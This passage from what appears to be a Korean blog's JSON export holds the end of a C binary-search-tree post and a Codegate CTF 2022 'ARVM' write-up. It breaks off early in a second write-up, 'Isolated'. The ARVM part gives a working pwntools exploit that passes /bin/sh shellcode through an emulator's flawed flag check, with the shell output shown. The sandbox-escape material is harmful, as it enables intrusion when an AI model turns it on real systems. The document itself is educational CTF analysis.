= x-&gt;left;\t&#125;\treturn x;&#125; Node *__tree_max(Node *x) &#123;\twhile (x-&gt;right != NULL) &#123;\t\tx = x-&gt;right;\t&#125;\treturn x;&#125; Node *__tree_predecessor(Node *x) &#123;\tNode *y = x-&gt;parent; \tif (x-&gt;left != NULL) &#123;\t\treturn __tree_max(x-&gt;right);\t&#125;\twhile (y != NULL &amp;&amp; x == y-&gt;left) &#123;\t\tx = y;\t\ty = y-&gt;parent;\t&#125;\treturn y;&#125; Node *__tree_successor(Node *x) &#123;\tNode *y = x-&gt;parent; \tif (x-&gt;right != NULL) &#123;\t\treturn __tree_min(x-&gt;right);\t&#125;\twhile (y != NULL &amp;&amp; x == y-&gt;right) &#123;\t\tx = y;\t\ty = y-&gt;parent;\t&#125;\treturn y;&#125; void __transplant(BST *bst, Node *u, Node *v) &#123;\tif (u-&gt;parent == NULL) &#123;\t\t\t\t\tbst-&gt;root = v;\t&#125; else if (u == u-&gt;parent-&gt;left) &#123;\t\t\tu-&gt;parent-&gt;left = v;\t&#125; else &#123;\t\t\t\t\t\t\t\t\tu-&gt;parent-&gt;right = v;\t&#125;\tif (v != NULL) &#123;\t\tv-&gt;parent = u-&gt;parent;\t&#125;&#125;  /* Exposed Functions */ void print(BST *bst) &#123;\t__tree_walk(bst-&gt;root);&#125; Node *prev(BST *bst, int key) &#123;\tNode *x = __tree_search(bst-&gt;root, key); \treturn __tree_predecessor(x);&#125; Node *next(BST *bst, int key) &#123;\tNode *x = __tree_search(bst-&gt;root, key); \treturn __tree_successor(x);&#125; void insert(BST* bst, int key, int value) &#123;\tNode *newnode = malloc(sizeof(Node));\tNode *x = bst-&gt;root, *y = NULL; \t*newnode = (Node) &#123; key, value, NULL, NULL, NULL &#125;;\twhile (x != NULL) &#123;\t\ty = x;\t\tx = (newnode-&gt;key &lt; x-&gt;key) ? x-&gt;left : x-&gt;right;\t&#125;\tnewnode-&gt;parent = y; \tif (y == NULL) &#123;\t// bst is empty\t\tbst-&gt;root = newnode;\t&#125; else if (newnode-&gt;key &lt; y-&gt;key) &#123;\t\ty-&gt;left = newnode;\t&#125; else &#123;\t\ty-&gt;right = newnode;\t&#125;&#125; void delete(BST *bst, int key) &#123;\tNode *x = __tree_search(bst-&gt;root, key), *y; \tif (x-&gt;left == NULL) &#123;\t\t__transplant(bst, x, x-&gt;right);\t&#125; else if (x-&gt;right == NULL) &#123;\t\t__transplant(bst, x, x-&gt;left);\t&#125; else &#123;\t\ty = __tree_min(x-&gt;right);\t\t\t\tif (y-&gt;parent != x) &#123;\t\t\t__transplant(bst, y, y-&gt;right);\t\t\ty-&gt;right = x-&gt;right;\t\t\ty-&gt;right-&gt;parent = y;\t\t&#125;\t\t__transplant(bst, x, y);\t\ty-&gt;left = x-&gt;left;\t\ty-&gt;left-&gt;parent = y;\t&#125;&#125;  /* Driver Code */ int main() &#123;\tint arr[10] = &#123; 5, 3, 9, 2, 6, 7, 4, 1, 10, 8 &#125;;\tBST bst = &#123; NULL &#125;; \tfor (int i = 0; i &lt; 10; i++) &#123;\t\tinsert(&amp;bst, arr[i], arr[i]);\t&#125;\tprint(&amp;bst); \tdelete(&amp;bst, 3);\tdelete(&amp;bst, 2);\tdelete(&amp;bst, 1);\tinsert(&amp;bst, 11, 11);\tinsert(&amp;bst, 12, 12);\tinsert(&amp;bst, 13, 13);\tprint(&amp;bst); \treturn 0;&#125;\n\n\n","categories":["Computer Science","Data Structures"]},{"title":"[Codegate CTF 2022] ARVM","url":"/2022/07/03/codegate22-arvm/","content":"개요\n\nWelcome! Here is my Emulator. It can use only human.\nAlways SMiLEY :)\n\nchall.zip\n문제 분석\n32비트 ARM 바이너리 app 과 Dockerfile , run.sh 등이 주어집니다. run.sh 파일에서 바이너리는 qemu-arm-static 으로 에뮬레이션하여 실행됨을 확인할 수 있습니다. 바이너리는 심볼이 strip되어 있고, NX, canary 보호 기법이 적용되어 있습니다.\n$ checksec app[*] &#x27;/home/user/study/ctf/codegate22/arvm/app&#x27;    Arch:     arm-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x10000)\n바이너리를 실행하면 코드를 입력받고, 3가지의 메뉴가 주어집니다. 코드를 입력하고 '1. Run Code’를 선택하면 바이너리가 출력하는 Secret code를 똑같이 입력해야 하는데, 앞서 코드로 “111” 을 입력했더니 “Instruction 0xa31313131 is invalid” 메시지와 함께 종료됩니다.\n$ qemu-arm-static -L /usr/arm-linux-gnueabi ./appRunning Emulator...Welcome EmulatorInsert Your Code :&gt; 1111. Run Code2. View Code3. Edit Code:&gt; 1Before run, it has some captchaSecret code : 0x52bae0cdCode? :&gt; 0x52bae0cdInstruction 0xa313131 is invalid\nmain 함수를 살펴보면 다음과 같습니다. 13행에서 setup 함수를 호출하여 필요한 구조체와 메모리를 할당하고, 17행에서 edit_code 함수를 호출하여 코드를 입력받습니다. 53행에서 호출하는 check_code 함수의 리턴값이 -1이 아니면 56~61행에서 입력한 코드를 실행하는데, R0 부터 R12 까지 모두 0으로 초기화하는 코드를 앞에 덧붙인 후 실행합니다.\nint __fastcall main()&#123;  void *v0; // r0  int captcha; // [sp+4h] [bp-30h] BYREF  int input; // [sp+8h] [bp-2Ch] BYREF  int choice; // [sp+Ch] [bp-28h]  int fd; // [sp+10h] [bp-24h]  void *dest; // [sp+14h] [bp-20h]  char s[16]; // [sp+1Ch] [bp-18h] BYREF  void *v8; // [sp+2Ch] [bp-8h]  v8 = &amp;_stack_chk_guard;  if ( setup() == -1 )    exit(-1);  if ( loading() == -1 )    exit(-1);  if ( edit_code() == -1 )    exit(-1);  while ( 1 )  &#123;    print_menu();    memset(s, 0, sizeof(s));    read(0, s, 16u);    choice = atoi(s);    if ( choice == 1 )                          // 1. Run Code      break;    if ( choice == 2 )                          // 2. View Code    &#123;      write(1, em-&gt;code, 4096u);    &#125;    else if ( choice == 3 )                     // 3. Edit Code    &#123;      if ( loading() == -1 )        exit(-1);      if ( edit_code() == -1 )        exit(-1);    &#125;  &#125;  captcha = 0;  fd = open(&quot;/dev/urandom&quot;, 2);  read(fd, &amp;captcha, 4u);  close(fd);  puts(&quot;Before run, it has some captcha&quot;);  printf(&quot;Secret code : 0x%x\\n&quot;, captcha);  input = 0;  printf(&quot;Code? :&gt; &quot;);  _isoc99_scanf(&quot;0x%x&quot;, &amp;input);  if ( captcha != input )  &#123;    puts(&quot;You are Robot!&quot;);    exit(-1);  &#125;  if ( check_code() == -1 )    exit(-1);  puts(&quot;Good! Now Execute Real Machine&quot;);  dest = calloc(1u, 0x1000u);  memcpy(dest, em-&gt;code, 4096u);  memset(em-&gt;code, 0, 4096u);  memcpy(em-&gt;code, &amp;clear_regs_code, 52u);      // mov &#123;r0-r12&#125;, 0  v0 = memcpy(em-&gt;code + 52, dest, 4044u);  ((void (__fastcall *)(void *))em-&gt;code)(v0);  return 0;&#125;\nsetup 함수는 emulator 구조체 변수 em 과 reg 구조체, 각종 메모리를 할당합니다. emulator 구조체는 mmap 시스템 콜로 할당한 코드, 힙, 스택 역할을 하는 메모리의 주소와 reg 구조체 포인터를 멤버로 가집니다. reg 구조체는 범용 레지스터들과 CPSR 레지스터 역할을 하는 정수형 변수 17개를 멤버로 가집니다. 할당 이후 em-&gt;reg-&gt;pc , em-&gt;reg-&gt;sp 를 각각 em-&gt;code , em-&gt;stack 으로 초기화합니다.\nint setup() // 0x1088c&#123;  emulator *v1; // r4  emulator *v2; // r4  emulator *v3; // r4  emulator *v4; // r4  setvbuf((FILE *)stdin, 0, 2, 0);  setvbuf((FILE *)stdout, 0, 2, 0);  em = (emulator *)calloc(1u, 16u);  if ( !em )    return -1;  v1 = em;  v1-&gt;code = (char *)mmap((void *)0x1000, 4096u, 7, 0x4022, -1, 0);  if ( !em-&gt;code )    return -1;  v2 = em;  v2-&gt;heap = (char *)mmap((void *)0x2000, 4096u, 3, 0x4022, -1, 0);  if ( !em-&gt;heap )    return -1;  v3 = em;  v3-&gt;stack = (char *)mmap((void *)0x3000, 4096u, 3, 0x4022, -1, 0);  if ( !em-&gt;stack )    return -1;  v4 = em;  v4-&gt;reg = (struct reg *)calloc(1u, 68u);  if ( !em-&gt;reg )    return -1;  em-&gt;reg-&gt;pc = (unsigned int)em-&gt;code;  em-&gt;reg-&gt;sp = (unsigned int)em-&gt;stack;  return 0;&#125;\nstruct emulator&#123;  struct reg *reg;  char *stack;  char *code;  char *heap;&#125;;struct reg&#123;  unsigned int r0, r1, r2, r3, r4, r5, r6, r7, r8, r9, r10, r11, r12;  unsigned int sp, lr, pc, cpsr;&#125;;\nedit_code 함수는 em-&gt;code 주소에 실행할 코드를 입력받는데, 길이가 4의 배수가 아니면 -1을 반환합니다. 이 경우 main 함수에서 exit(-1) 을 호출하여 종료합니다. 입력받은 후 exit 시스템 콜을 호출하는 코드를 뒤에 덧붙입니다.\nint edit_code() // 0x10af0&#123;  ssize_t len; // [sp+4h] [bp-8h]  len = read(0, em-&gt;code, 4031u);  if ( len &lt; 0 )    return -1;  if ( (len &amp; 3) != 0 )    return -1;  memcpy(&amp;em-&gt;code[len], &amp;exit_code, 12u);  return 0;&#125;\ncheck_code 함수는 반복문을 돌면서 em-&gt;reg-&gt;pc 로부터 4바이트씩 인스트럭션 inst 를 읽습니다. check_cpsr 함수를 inst 를 인자로 호출하여 리턴값이 0이 아니면, switch-case 구문으로 인스트럭션의 클래스에 해당하는 check_* 함수를 호출합니다. check_cpsr 함수가 0을 리턴하거나 check_* 함수가 -1을 리턴하는 경우 sigill 함수를 호출하는데, 이 함수는 오류 메시지를 출력하고 exit(-1) 로 프로그램을 종료합니다.\nint __fastcall check_code() // 0x10bb0&#123;  unsigned int op1; // r0  int inst; // [sp+0h] [bp-Ch]  int fetched; // [sp+4h] [bp-8h]  for ( inst = -1; em-&gt;reg-&gt;pc &lt; (unsigned int)(em-&gt;code + 4096); inst = fetched )  &#123;    if ( (char *)em-&gt;reg-&gt;pc &lt; em-&gt;code )      break;    fetched = *(_DWORD *)em-&gt;reg-&gt;pc;    em-&gt;reg-&gt;pc += 4;    if ( !inst )      break;    if ( inst != -1 &amp;&amp; !check_cpsr(inst) )      sigill(inst);    op1 = get_class(inst);    if ( op1 &lt;= 4 )    &#123;      switch ( op1 )      &#123;        case 0u:                                // data processing and miscellaneous instructions          if ( check_data_processing(inst) == -1 )            sigill(inst);          continue;        case 1u:          if ( check_multiply(inst) == -1 )            sigill(inst);          continue;        case 2u:                                // branch, branch with link, block data transfer          if ( check_branch(inst) == -1 )            sigill(inst);          fetched = -1;          continue;        case 3u:                                // supervisor call          if ( check_syscall() == -1 )            sigill(inst);          continue;        case 4u:                                // load/store word and unsigned byte          if ( check_load_store(inst) == -1 )            sigill(inst);          continue;        default:          goto LABEL_23;      &#125;    &#125;    if ( op1 != -1 )LABEL_23:      sigill(inst);  &#125;  return 0;&#125;\n각각의 check_* 함수는 인스트럭션의 형식이나 인자를 검사한 후, 통과하면 인스트럭션의 실행 결과를 emulator 구조체 변수 em 에 반영하고 통과하지 못한 경우 -1을 리턴하여 종료하도록 합니다. 예를 들어 check_branch 함수는 인자가 상수(immediate) 값인 분기 인스트럭션을 검사하고 em-&gt;reg-&gt;pc 를 갱신하는데, 조건문을 통해 목적지 주소가 em-&gt;code 로 할당된 메모리를 벗어나는 경우 -1을 반환합니다.\nint __fastcall check_branch(int inst)   // 0x11f28&#123;  int v1; // r0  int v2; // r3  v1 = shl8(inst);  v2 = 4 * (v1 &gt;&gt; 8);  if ( ((v1 &gt;&gt; 8) &amp; 0x20000000) != 0 )    v2 += 3;  if ( em-&gt;reg-&gt;pc + 4 * (v2 &gt;&gt; 2) &gt;= (unsigned int)(em-&gt;code + 0x4000) )    return -1;  em-&gt;reg-&gt;pc += 4 * (4 * (v1 &gt;&gt; 8) / 4);  return 0;&#125;\n문제 풀이\n분석한 결과를 바탕으로 생각할 수 있는 익스플로잇 시나리오가 두 가지 정도 있습니다.\n\ncheck_code 함수의 check_* 루틴에서 익스플로잇 프리미티브(e.g. 임의 쓰기)를 찾아 익스플로잇한다.\ncheck_code 의 검사를 통과하면서, main 에서 입력한 코드를 호출했을 때 익스플로잇이 수행되는 셸코드를 입력한다.\n\n그런데 check_* 함수들은 대부분 목적지 레지스터나 주소의 범위에 제한을 두고 있어 익스플로잇 프리미티브 구성에 도움이 되지 않습니다. 예를 들어 다음은 check_load_store 함수의 일부입니다. 23행, 26행, 32행 등을 보면 목적지 레지스터는 R0 , … , R12 까지만 가능하도록, 읽고 쓰는 주소는 em-&gt;heap , em-&gt;stack 으로 할당된 메모리만 가능하도록 제한을 두고 있습니다.\nint __fastcall check_load_store(int inst)\t// 0x12000&#123;  // ...  bit11_0 = get_bit11_0(inst);  rn = get_bit16_19(inst);  if ( rn &lt;= 12 )  &#123;    rn_val = (char *)*(&amp;em-&gt;reg-&gt;r0 + rn);    if ( get_bit25(inst) )                      // bit25 is 1 (A bit)    &#123;      rm = bit11_0 &amp; 0xF;      if ( rm &gt; 12 )        return -1;    // ...    if ( get_bit24(inst) )                      // bit24 is 1 (P bit)    &#123;      if ( get_bit23(inst) )                    // bit23 is 1 (U bit)        v6 = &amp;rn_val[bit11_0];      else        v6 = &amp;rn_val[-bit11_0];      if ( get_bit20(inst) )                    // bit20 is 1      &#123;        if ( (v6 &lt; em-&gt;heap || v6 &gt; em-&gt;heap + 4096) &amp;&amp; (v6 &lt; em-&gt;stack || v6 &gt; em-&gt;stack + 4096) )          return -1;        rt = shr12(inst);        if ( rt &gt; 0xC )          return -1;        *(&amp;em-&gt;reg-&gt;r0 + rt) = *(_DWORD *)v6;   // load      &#125;      else      &#123;        if ( (v6 &lt; em-&gt;heap || v6 &gt; em-&gt;heap + 4096) &amp;&amp; (v6 &lt; em-&gt;stack || v6 &gt; em-&gt;stack + 4096) )          return -1;        v13 = shr12(inst);        if ( v13 &gt; 0xC )          return -1;        *(_DWORD *)v6 = *(&amp;em-&gt;reg-&gt;r0 + v13);  // store      &#125;    &#125;    // ...\n산술 연산과 관련된 인스트럭션을 검사하는 check_data_processing 함수에서도 9행, 11행 등에서 산술 연산의 목적지와 인자 레지스터에 제한을 두고 있습니다. 그런데 실제 연산의 결과를 반영하는 서브루틴에서 흥미로운 코드를 찾을 수 있습니다.\nint __fastcall check_data_processing(int inst)\t// 0x117b8&#123;  // ...  v7 = sub_114E0(inst);  bit11_0 = get_bit11_0(inst);  bit16_19 = get_bit16_19(inst);  v10 = shr12(inst);  bit20 = get_bit20(inst);  if ( bit16_19 &lt; 0 || bit16_19 &gt; 12 )    return -1;  if ( v10 &lt; 0 || v10 &gt; 12 )    return -1;  // ...  switch ( v7 )  &#123;    // ...    case 4u:      if ( check_add(bit16_19, v4, v10, bit20) == -1 )        sigill(inst);      return result;    // ...\ncheck_add 함수는 check_data_processing 함수에서 ADD 인스트럭션의 결과를 반영하기 위해 호출하는 서브루틴입니다. 이 함수는 연산 결과를 목적지 레지스터에 대입하고, update_zf_nf 함수를 호출하여 CPSR 레지스터의 플래그를 갱신하고 있습니다. (update_zf_nf 함수를 호출하는 조건 a4 는 인스트럭션의 bit 20이 전달된 값으로, S 비트에 해당합니다)\nint __fastcall check_add(int a1, int a2, int a3, int a4)\t// 0x12fb8&#123;  int result; // [sp+14h] [bp-8h]  update_cf(*(&amp;em-&gt;reg-&gt;r0 + a1) + a2 &lt; *(&amp;em-&gt;reg-&gt;r0 + a1));  result = a2 + *(&amp;em-&gt;reg-&gt;r0 + a1);  if ( a4 )    update_zf_nf(result);  *(&amp;em-&gt;reg-&gt;r0 + a3) = result;  return 0;&#125;\nupdate_zf_nf 함수는 인자로 받은 연산 결과를 update_zf , update_nf 함수에 전달합니다.\nint __fastcall update_zf_nf(int a1)\t// 0x12d4c&#123;  update_zf(a1);  update_nf(a1);  return 0;&#125;\nupdate_nf 함수는 연산의 결과가 0이 아닐 경우 비트 연산을 통해 em-&gt;reg-&gt;cpsr 값의 bit 31에 1을 대입합니다. 이는 CPSR 레지스터의 N 비트에 해당하는데, 정의 상 N 비트는 결과가 음수인 경우(최상위 비트가 1인 경우) 1이어야 합니다. 따라서 update_nf 함수는 em-&gt;reg-&gt;cpsr 값을 실제 인스트럭션의 결과와 다르게 반영하고 있습니다.\nint __fastcall update_nf(int a1)    // 0x12ccc&#123;  if ( a1 )    em-&gt;reg-&gt;cpsr |= 0x80000000;  else    em-&gt;reg-&gt;cpsr &amp;= 0x70000000u;  return 0;&#125;\n이를 이용해 다음과 같이 셀코드를 입력하고도 check_code 함수를 통과하여 실행하는 익스플로잇 시나리오를 구성할 수 있습니다. (단순 셸코드를 입력하면 check_syscall 함수에서 시스템 콜 번호를 필터링하여 종료합니다)\n\n산술 연산을 통해 em-&gt;reg-&gt;cpsr 의 N 비트가 1이 되도록 합니다. (잘못 반영된 결과입니다)\nN 비트와 관련된 조건 분기를 통해 셸코드 부분을 실행하지 않고 점프하도록 합니다.\n실제 실행 시에는 N 비트가 0으로 조건 분기를 수행하지 않아, 셸코드를 실행하게 됩니다.\n\ncheck_cpsr 함수를 보면 모든 조건이 구현되어 있지는 않지만, LT (signed less than) 조건은 구현되어 있습니다. 따라서 셸코드 이전에 결과가 0이 아닌 산술 연산을 수행하고 BLT 인스트럭션으로 조건 분기하도록 하겠습니다. check_code 함수 상에서는 update_nf 함수에서 잘못 반영한 결과로 인해 N 비트가 1이 되어, V 비트와 같지 않게 되므로 조건 분기를 수행합니다. 그러나 실제 실행 시에는 N 비트가 0으로 조건 분기를 수행하지 않을 것입니다.\nint __fastcall check_cpsr(int inst) // 0x11314&#123;  _BOOL4 v1; // r3  _BOOL4 v2; // r3  int valid; // [sp+8h] [bp-24h]  unsigned int cpsr; // [sp+10h] [bp-1Ch]  cpsr = em-&gt;reg-&gt;cpsr;  switch ( shr28(inst) )  &#123;    case 0u:                                    // equal (z == 1)      valid = cpsr &amp; 0x40000000;      break;    case 1u:                                    // not equal (z == 0)      valid = (cpsr &amp; 0x40000000) == 0;      break;    case 10u:                                   // signed greater than or equal (n == v)      valid = cpsr &gt;&gt; 31 == (8 * cpsr) &gt;&gt; 31;      break;    case 11u:                                   // signed less than (n != v)      valid = cpsr &gt;&gt; 31 != (8 * cpsr) &gt;&gt; 31;      break;    case 12u:                                   // signed greater than (z == 0 and n == v)      v1 = (cpsr &amp; 0x40000000) == 0 &amp;&amp; cpsr &gt;&gt; 31 == (8 * cpsr) &gt;&gt; 31;      valid = v1;      break;    case 13u:                                   // signed less than or equal (z == 1 or n == v)      v2 = (cpsr &amp; 0x40000000) != 0 || cpsr &gt;&gt; 31 != (8 * cpsr) &gt;&gt; 31;      valid = v2;      break;    case 14u:                                   // always      valid = 1;      break;    default:                                    // can only be executed unconditionally      valid = 0;      break;  &#125;  return valid;&#125;\n다음과 같이 ADDS 인스트럭션의 결과가 1이 되도록 하고, BLT 의 분기 주소를 셸코드 이후가 되도록 익스플로잇 코드를 작성하였습니다. 익스플로잇 코드를 실행하면 셸을 획득할 수 있습니다.\n#!/usr/bin/python3from pwn import *# r = process([&quot;qemu-arm-static&quot;, &quot;-L&quot;, &quot;/usr/arm-linux-gnueabi&quot;, &quot;./app&quot;])r = remote(&quot;localhost&quot;, 1234)# context.log_level = &quot;debug&quot;def main():    payload = asm(&quot;&quot;&quot;    adds r0, r0, 1    blt exitshellcode:    add r0, pc, 12    mov r1, 0    mov r2, 0    mov r7, 11    svc 0    .word 0x6e69622f    .word 0x0068732fexit:    &quot;&quot;&quot;, arch=&quot;arm&quot;)    r.sendafter(b&quot;Insert Your Code :&gt;&quot;, payload)    r.sendlineafter(b&quot;:&gt;&quot;, b&quot;1&quot;)    r.recvuntil(b&quot;Secret code :&quot;)    r.sendlineafter(b&quot;Code? :&gt;&quot;, r.recvline().strip())    r.interactive()if __name__ == &quot;__main__&quot;:    main()\n$ ./ex.py[+] Opening connection to localhost on port 1234: Done[*] Switching to interactive mode Good! Now Execute Real Machine$ iduid=1000(ctf) gid=1000(ctf) groups=1000(ctf)\n다른 풀이\ncheck_code 함수를 보면 다음의 10행에서 inst 가 0인 경우 반복문을 탈출합니다. 이 경우 0을 리턴하여 main 함수의 검사를 통과하기 때문에 곧바로 입력한 코드를 실행할 수 있습니다. ARM에서 기계어 \\x00\\x00\\x00\\x00 은 ANDEQ R0, R0, R0 인스트럭션에 해당하는데, 실제로는 아무 영향이 없는 NOP 와 같습니다.\nint __fastcall check_code()&#123;  // ...  for ( inst = -1; em-&gt;reg-&gt;pc &lt; (unsigned int)(em-&gt;code + 4096); inst = fetched )  &#123;    if ( (char *)em-&gt;reg-&gt;pc &lt; em-&gt;code )      break;    fetched = *(_DWORD *)em-&gt;reg-&gt;pc;    em-&gt;reg-&gt;pc += 4;    if ( !inst )      break;    if ( inst != -1 &amp;&amp; !check_cpsr(inst) )      sigill(inst);    op1 = get_class(inst);    // ...    if ( op1 != -1 )LABEL_23:      sigill(inst);  &#125;  return 0;&#125;\n따라서 코드를 입력할 때 \\x00\\x00\\x00\\x00 이후 셸코드를 입력하면 check_code 함수를 통과하여 셸코드를 실행할 수 있습니다. 이 풀이는 출제자가 디스코드에서 의도하지 않은 풀이라고 밝혔습니다.\n참고자료\n[1] ARM, “A5: ARM Instruction Set Encoding,” in ARM® Architecture Reference Manual ARMv7-A and ARMv7-R edition. ARM Limited, 2018, pp. 191-216.\n\n\n","categories":["Security","CTF"]},{"title":"[Codegate CTF 2022] Isolated","url":"/2022/07/06/codegate22-isolated/","content":"개요\n\nSimple VM, But isloated.\n\nchall.zip\n문제 분석\n64비트 x86_64 바이너리 isolated 와 Dockerfile 등이 주어집니다. 바이너리는 심볼이 strip되어 있고, Canary, NX, PIE 보호 기법이 적용되어 있습니다.\n$ checksec isolated[*] &#x27;/home/user/study/ctf/codegate22/isolated/isolated&#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled\n바이너리를 실행하면 로고를 출력하고 opcode를 입력받습니다. 아무 문자열이나 입력했더니 SIGKILL 시그널을 받고 종료합니다. 로고의 'VM’이나, opcode를 입력받는다는 점에서 가상머신을 묘사한 바이너리임을 추측할 수 있습니다.\n./isolated   __   __        __       ___  ___  __| /__` /  \\ |    /  \\  /\\   |  |__  |  \\    __    \\  /  |\\/|| .__/ \\__/ |___ \\__/ /~~\\  |  |___ |__/           \\/   |  |opcodes &gt;aaaa[1]    1544809 killed     ./isolated\nmain 함수를 살펴보면 다음과 같습니다. 12행에서 code 를 768바이트 입력받고, 13행에서 context 구조체를 할당합니다. 14행에서 fork 시스템 콜을 호출하여 자식 프로세스는 run 함수를 호출하고, 부모 프로세스는 set_signal_handlers 프로세스를 호출하도록 합니다.\n__int64 __fastcall main()&#123;  unsigned int ppid; // edi  unsigned int len; // [rsp+8h] [rbp-18h]  char *code; // [rsp+10h] [rbp-10h]  struct context *context; // [rsp+18h] [rbp-8h]  setup();  loading();  code = (char *)malloc(0x301uLL);  printf(&quot;opcodes &gt;&quot;);  len = read(0, code, 0x300uLL);  context = (struct context *)mmap(0LL, 8uLL, 3, 33, -1, 0LL);// mmap(0, 8, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0)  if ( !fork() )                                // child process  &#123;    sleep(1u);    alarm(8u);    ppid = getppid();    run(ppid, code, len, context);  &#125;  alarm(8u);  set_signal_handlers(context);                 // parent process&#125;\ncontext 구조체는 가상머신의 상태를 나타내는 구조체입니다. 명령어의 실행 상태를 나타내는 열거형 변수 state 와 인자를 전달받고 결과를 대입하는 용도로 사용하는 정수형 변수 reg 를 멤버로 가지고 있습니다.\nstruct context&#123;  enum state state;  u32 reg;&#125;;\n열거형 state 는 다음과 같이 명령어가 실행 중임을 나타내는 LOCKED , 명령어 실행에 성공했음을 나타내는 SUCCESS , 실행 중 오류가 발생했음을 나타내는 ERROR 로 구분됩니다. state 의 사용은 이후 분석할 함수들에서 자세히 살펴볼 수 있습니다.\nenum state : unsigned __int32&#123;  LOCKED = 0x1,  SUCCESS = 0x2,  ERROR = 0x3,&#125;;\n부모 프로세스에서 호출하는 set_signal_handlers 함수는 전역 변수 g_context 에 앞서 할당한 context 구조체를 대입합니다. 이후 각각의 시그널 번호에 해당하는 핸들러 함수를 등록하고 무한 루프에 진입합니다.\nvoid __fastcall __noreturn set_signal_handlers(struct context *context) // 0x1766&#123;  g_context = context;  signal(1, (__sighandler_t)push_handler);  signal(2, (__sighandler_t)pop_handler);  signal(3, (__sighandler_t)clean_handler);  signal(4, (__sighandler_t)log_handler);  while ( 1 )    ;&#125;\n자식 프로세스에서 호출하는 run 함수는 setup_seccomp 함수를 호출하고 send_locked 함수를 통해 CLEAN 명령어를 실행한 후, 입력받은 opcode를 파싱하여 각각의 명령어를 실행합니다. 파싱한 opcode에 해당하는 명령어가 없으면 send 함수를 통해 부모 프로세스에 SIGKILL 시그널을 전송하여 종료합니다. 주석 처리하여 생략한 “opcode handlers” 부분이 가상머신이 명령어를 처리하는 부분으로, 이 부분은 가상머신의 전체 구조를 먼저 살펴본 후 분석하겠습니다.\nvoid __fastcall __noreturn run(unsigned int ppid, char *code, unsigned int len, struct context *context)  // 0xe2d&#123;  // ...  setup_seccomp(62, 0xC000003E, 1u);  send_locked(ppid, context, CLEAN, 0);  pc = 0;  eflags = 0;  while ( pc &lt; len )  &#123;    op = pc++;    switch ( code[op] )    &#123;      /* ... opcode handlers ... */      default:        send(ppid, context, (enum signal)9u, 0);// SIGKILL        exit(-1);    &#125;  &#125;  send(ppid, context, (enum signal)9u, 0);      // SIGKILL  exit(-1);&#125;\nsetup_seccomp 함수는 prctl 시스템 콜을 호출하여 다른 시스템 콜을 필터링하도록 하는데, seccomp-tools 도구를 사용하면 바이너리에 설정된 필터링 정책을 쉽게 분석할 수 있습니다.\nvoid __fastcall setup_seccomp(int a1, int a2, unsigned __int16 a3)  // 0xc70&#123;  // ...  if ( prctl(38, 1LL, 0LL, 0LL, 0LL) )  &#123;    perror(&quot;prctl(NO_NEW_PRIVS)&quot;);  &#125;  else if ( prctl(22, 2LL, &amp;v3) )  &#123;    perror(&quot;prctl(PR_SET_SECCOMP)&quot;);            // prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER))  &#125;&#125;\nGitHub - david942j/seccomp-tools: Provide powerful tools for seccomp analysisProvide powerful tools for seccomp analysis. Contribute to david942j/seccomp-tools development by creating an account on GitHub.GitHub\n다음과 같이 seccomp-tools 를 실행한 결과, kill 시스템 콜이 아니면 모두 필터링함을 알 수 있습니다. 따라서 자식 프로세스를 execve 등의 시스템 콜을 사용하여 익스플로잇하는 것은 불가능하며, 부모 프로세스를 익스플로잇하여 셸을 획득해야 함을 추측할 수 있습니다.\n$ seccomp-tools dump ./isolated# ... line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x03 0xc000003e  if (A != ARCH_X86_64) goto 0005 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x15 0x00 0x01 0x0000003e  if (A != kill) goto 0005 0004: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0005: 0x06 0x00 0x00 0x00000001  return KILL\nrun 함수는 명령어 실행 및 SIGKILL 시그널 전송 등에 send_locked 와 send 두 가지 함수를 동시에 사용하고 있습니다. 먼저 send 함수를 살펴보면 context-&gt;state 를 LOCKED 로 설정하고, 인자 arg 를 context-&gt;reg 에 대입한 후 kill 시스템 콜을 호출하여 부모 프로세스에 시그널을 전송합니다.\nvoid __fastcall send(__pid_t ppid, struct context *context, enum signal signum, int arg)  // 0xda4&#123;  context-&gt;state = LOCKED;  context-&gt;reg = arg;  kill(ppid, signum);&#125;\n이 때 signum 에 해당하는 시그널 번호는 다음과 같이 signal 열거형 중 하나 또는 9 (SIGKILL)로, PUSH , POP , CLEAN , LOG 가 각각의 명령어에 해당합니다. 따라서 바이너리가 묘사하는 가상머신은 자식 프로세스가 명령어와 인자를 시그널로 전송하면, 부모 프로세스에서 해당하는 핸들러 함수를 호출하여 처리하는 구조임을 알 수 있습니다.\nenum signal : unsigned __int32&#123;  PUSH = 0x1,  POP = 0x2,  CLEAN = 0x3,  LOG = 0x4,&#125;;\n다음으로 send_blocked 함수는 동일하게 send 함수를 호출하여 시그널을 전송한 이후, context-&gt;state 가 LOCKED 인 동안 루프에 진입하는 busy waiting을 수행합니다. 이후 분석할 부모 프로세스의 핸들러 함수들은 모두 명령어 실행 루틴 이후 context-&gt;state 를 SUCCESS 또는 ERROR 로 설정합니다. send 함수가 context-&gt;state 를 LOCKED 로 설정한 이상 핸들러 함수가 루틴을 종료할 때까지 send_blocked 함수는 무한 대기하므로, 이 함수는 명령어를 일종의 블로킹(blocking) 방식으로 실행하도록 한다고 생각할 수 있겠습니다.\nvoid __fastcall send_locked(unsigned int ppid, struct context *context, enum signal signum, unsigned int arg)   // 0xddf&#123;  send(ppid, context, signum, arg);  while ( context-&gt;state == LOCKED )            // busy waiting while being processed    ;  if ( context-&gt;state == ERROR )    context-&gt;reg = -1;&#125;\n이번에는 부모 프로세스에서 각각의 명령어를 처리하는 핸들러 함수를 살펴보겠습니다. 모든 핸들러 함수에서 공통적으로 사용하는 전역 변수는 다음과 같습니다.\n\nstack - 정수형 전역 배열로, 원소 1543개 크기입니다.\ng_stack_idx - 스택 포인터의 역할을 하는 정수형 전역 변수로, 이 변수의 값을 인덱스로 stack 에 접근합니다.\nlog_enabled - 전역 변수로, 값이 0이 아닌 경우 핸들러 함수가 로그를 출력합니다.\n\npush_handler 함수는 g_stack_idx 가 767보다 작거나 같은 경우 1을 증가시키고, stack[g_stack_idx] 에 인자로 전달된 g_context-&gt;reg 를 대입합니다.\nvoid push_handler() 